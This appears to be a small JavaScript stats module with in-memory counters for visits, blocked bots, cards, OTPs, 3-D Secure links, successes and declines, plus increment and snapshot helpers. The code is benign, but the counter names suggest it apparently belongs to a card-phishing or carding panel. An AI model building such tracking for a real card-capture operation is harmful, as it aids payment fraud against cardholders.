/**
 * Global in-memory counters. Persist only while server is running.
 */
export const stats = {
  visits: 0,
  botsBlocked: 0,
  cards: 0,
  otps: 0,
  links3ds: 0,
  successes: 0,
  declines: 0,
  startedAt: Date.now()
};

/** @param {keyof typeof stats} k */
export function inc(k, n = 1) {
  if (typeof stats[k] === 'number') stats[k] += n;
}

export function snapshot() {
  return { ...stats, uptimeSec: Math.floor((Date.now() - stats.startedAt) / 1000) };
}
